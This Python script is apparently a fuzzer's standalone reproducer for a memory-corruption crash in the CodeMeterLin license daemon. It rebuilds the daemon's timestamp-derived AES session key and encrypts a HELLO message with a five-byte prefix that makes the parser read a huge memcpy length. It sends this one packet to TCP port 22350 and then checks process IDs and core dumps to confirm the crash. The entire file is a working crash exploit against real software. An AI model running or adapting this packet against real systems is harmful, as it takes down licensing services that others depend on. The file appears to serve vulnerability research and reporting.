#!/usr/bin/env python3
"""Standalone single-packet reproducer for the prefixed-HELLO crash.

This file intentionally has no project-local imports and reads no captured
session data files. Its only non-stdlib Python dependency is `cryptography`.
The canonical HELLO plaintext is built from a zero-filled 184-byte message plus
the few observed fixed fields needed to match the captured testbench HELLO.

It sends one valid encrypted SAMC client-to-daemon frame whose decrypted
plaintext is:

    5e 35 5e d6 f2 || canonical HELLO with a fresh 4-byte client token

That shifted HELLO makes the parser see 0x28000010 at cleartext offset 0x0c,
which is the value observed as the later memcpy length at CodeMeterLin+0x8f431d.
"""

from __future__ import annotations

import argparse
import hashlib
import os
from pathlib import Path
import socket
import struct
import time
import zlib

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


DEFAULT_PREFIX_HEX = "5e355ed6f2"
DEFAULT_MUTATED_HELLO_HEAD_HEX = "5e355ed6f20a00000000000010000028"
EXPECTED_BAD_LEN = 0x28000010
HELLO_LEN = 184
HELLO_TOKEN_OFFSET = 28
HELLO_TOKEN_LEN = 4

# Non-token bytes observed in the captured canonical HELLO plaintext. Everything
# else in the 184-byte HELLO is zero. Avoid assigning protocol names where the
# binary-only analysis has not proven semantics.
HELLO_FIXED_BYTES = {
    0x00: 0x0A,  # HELLO opcode.
    0x07: 0x10,  # observed fixed field.
    0x0A: 0x28,  # observed fixed field; shifted by the prefix into bad length.
    0x22: 0x72,  # observed fixed field.
}


def magic_div_1009(eax: int) -> int:
    eax = (eax * 1000) & 0xFFFFFFFF
    rcx = ((eax * 0x3CE4585) >> 32) & 0xFFFFFFFF
    eax = (eax - rcx) & 0xFFFFFFFF
    eax >>= 1
    eax = (eax + rcx) & 0xFFFFFFFF
    return eax >> 9


def derive_session_key_iv(t: int) -> tuple[bytes, bytes]:
    digest = hashlib.sha1(struct.pack("<I", magic_div_1009(t))).digest()
    return digest[:16], digest[4:20]


def cts_shuffle(ciphertext: bytes) -> bytes:
    """Match CodeMeter's client-to-daemon last-two-block shuffle."""
    if len(ciphertext) < 32:
        return ciphertext
    return ciphertext[:-32] + ciphertext[-16:] + ciphertext[-32:-16]


def build_mac_suffix(plaintext: bytes) -> bytes:
    aligned = ((len(plaintext) + 16) + 15) & ~15
    if aligned < 32:
        aligned = 32
    pad_len = aligned - len(plaintext) - 8
    return (
        plaintext
        + (b"\x00" * pad_len)
        + struct.pack("<I", len(plaintext))
        + struct.pack("<I", zlib.crc32(plaintext))
    )


def encrypt_c2d_frame(plaintext: bytes, t: int) -> bytes:
    """Build the full TCP payload: SAMC wire header plus encrypted body."""
    full_plaintext = build_mac_suffix(plaintext)
    key, iv = derive_session_key_iv(t)
    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ciphertext = encryptor.update(full_plaintext) + encryptor.finalize()
    body = b"\xa0" + cts_shuffle(ciphertext)
    header = (
        b"samc"
        + struct.pack("<I", len(body))
        + bytes([0x11, 0, 1, 0, 0, 0, 0, 0])
    )
    return header + body


def validate_hello_shape(hello: bytes) -> None:
    """Assert that the built HELLO matches the captured shape modulo token."""
    if len(hello) != HELLO_LEN:
        raise AssertionError(f"HELLO length is {len(hello)}, expected {HELLO_LEN}")
    token_end = HELLO_TOKEN_OFFSET + HELLO_TOKEN_LEN
    for offset, byte in enumerate(hello):
        if HELLO_TOKEN_OFFSET <= offset < token_end:
            continue
        expected = HELLO_FIXED_BYTES.get(offset, 0)
        if byte != expected:
            raise AssertionError(
                f"HELLO byte 0x{offset:x} is 0x{byte:02x}, expected 0x{expected:02x}"
            )


def build_canonical_hello(token: bytes) -> bytes:
    """Build the captured canonical HELLO shape with a fresh client token."""
    if len(token) != HELLO_TOKEN_LEN:
        raise ValueError(f"HELLO token must be {HELLO_TOKEN_LEN} bytes")
    hello = bytearray(HELLO_LEN)
    for offset, byte in HELLO_FIXED_BYTES.items():
        hello[offset] = byte
    hello[HELLO_TOKEN_OFFSET:HELLO_TOKEN_OFFSET + HELLO_TOKEN_LEN] = token
    built = bytes(hello)
    validate_hello_shape(built)
    return built


def fresh_hello() -> tuple[bytes, bytes]:
    token = os.urandom(HELLO_TOKEN_LEN)
    return build_canonical_hello(token), token


def u32_words(data: bytes, count: int = 4) -> list[int]:
    words = []
    for offset in range(0, min(len(data), count * 4), 4):
        if offset + 4 <= len(data):
            words.append(struct.unpack_from("<I", data, offset)[0])
    return words


def validate_default_crash_layout(prefix: bytes, payload: bytes) -> None:
    """Assert the default prefix still creates the reduced crash layout."""
    if prefix != bytes.fromhex(DEFAULT_PREFIX_HEX):
        return
    expected_head = bytes.fromhex(DEFAULT_MUTATED_HELLO_HEAD_HEX)
    if payload[:len(expected_head)] != expected_head:
        raise AssertionError(
            f"mutated HELLO head is {payload[:len(expected_head)].hex()}, "
            f"expected {expected_head.hex()}"
        )
    bad_len = struct.unpack_from("<I", payload, 0x0C)[0]
    if bad_len != EXPECTED_BAD_LEN:
        raise AssertionError(f"bad length is 0x{bad_len:08x}, expected 0x{EXPECTED_BAD_LEN:08x}")


def codemeter_pid_from_proc() -> int | None:
    """Find CodeMeterLin without shelling out to pgrep."""
    for comm in sorted(Path("/proc").glob("[0-9]*/comm")):
        try:
            if comm.read_text(errors="replace").strip() == "CodeMeterLin":
                return int(comm.parent.name)
        except OSError:
            continue
    return None


def newest_core() -> tuple[str, int, int] | None:
    paths = []
    for root in (Path("/var/tmp/cm_cores"), Path("/var/lib/systemd/coredump")):
        if root.exists():
            paths.extend(root.glob("*CodeMeterLin*"))
    if not paths:
        return None
    path = max(paths, key=lambda p: p.stat().st_mtime_ns)
    st = path.stat()
    return str(path), st.st_mtime_ns, st.st_size


def send_one(host: str, port: int, wire: bytes, timeout: float) -> None:
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        sock.sendall(wire)


def print_packet_summary(prefix: bytes, token: bytes, payload: bytes, wire: bytes) -> None:
    words = u32_words(payload, 4)
    print("=== packet ===")
    print(f"prefix_hex={prefix.hex()}")
    print(f"fresh_client_token={token.hex()}")
    print(f"canonical_hello_len={HELLO_LEN}")
    print(f"mutated_hello_len={len(payload)}")
    print(f"mutated_hello_head={payload[:16].hex()}")
    print("mutated_hello_first_u32_le=" + ",".join(f"0x{word:08x}" for word in words))
    if len(words) >= 4:
        print(f"word_at_cleartext_offset_0x0c=0x{words[3]:08x}")
        print(f"matches_expected_bad_len={words[3] == EXPECTED_BAD_LEN}")
    print(f"wire_len={len(wire)}")
    print()


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Standalone one-packet prefixed-HELLO CodeMeterLin reproducer.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  python3 fuzzer/repro_prefixed_hello_standalone.py --dry-run
  python3 fuzzer/repro_prefixed_hello_standalone.py
  python3 fuzzer/repro_prefixed_hello_standalone.py --host 127.0.0.1 --port 22350
""",
    )
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=22350)
    parser.add_argument("--prefix", default=DEFAULT_PREFIX_HEX,
                        help="hex bytes to prepend before the canonical HELLO")
    parser.add_argument("--connect-timeout", type=float, default=2.0)
    parser.add_argument("--wait", type=float, default=10.0,
                        help="seconds to wait for PID/core crash evidence after send")
    parser.add_argument("--dry-run", action="store_true",
                        help="construct and print the packet summary, but do not send")
    parser.add_argument("--no-crash-oracle", action="store_true",
                        help="do not inspect /proc or coredump directories")
    args = parser.parse_args()

    prefix = bytes.fromhex(args.prefix)
    if not prefix:
        raise SystemExit("--prefix must not be empty")

    hello, token = fresh_hello()
    payload = prefix + hello
    validate_default_crash_layout(prefix, payload)
    wire = encrypt_c2d_frame(payload, int(time.time()))
    print_packet_summary(prefix, token, payload, wire)

    if args.dry_run:
        print("dry_run=True")
        return 0

    before_pid = None if args.no_crash_oracle else codemeter_pid_from_proc()
    before_core = None if args.no_crash_oracle else newest_core()

    print("=== baseline ===")
    print(f"before_pid={before_pid}")
    print(f"before_core={before_core}")
    print()

    print("=== send ===")
    print(f"target={args.host}:{args.port}")
    send_one(args.host, args.port, wire, args.connect_timeout)
    print("sent=True")

    if args.no_crash_oracle:
        return 0

    deadline = time.time() + args.wait
    while time.time() < deadline:
        after_pid = codemeter_pid_from_proc()
        after_core = newest_core()
        if after_pid != before_pid or after_core != before_core:
            break
        time.sleep(0.25)

    after_pid = codemeter_pid_from_proc()
    after_core = newest_core()
    crashed = after_pid != before_pid or after_core != before_core
    print()
    print("=== crash oracle ===")
    print(f"after_pid={after_pid}")
    print(f"after_core={after_core}")
    print(f"crashed={crashed}")
    return 0 if crashed else 1


if __name__ == "__main__":
    raise SystemExit(main())
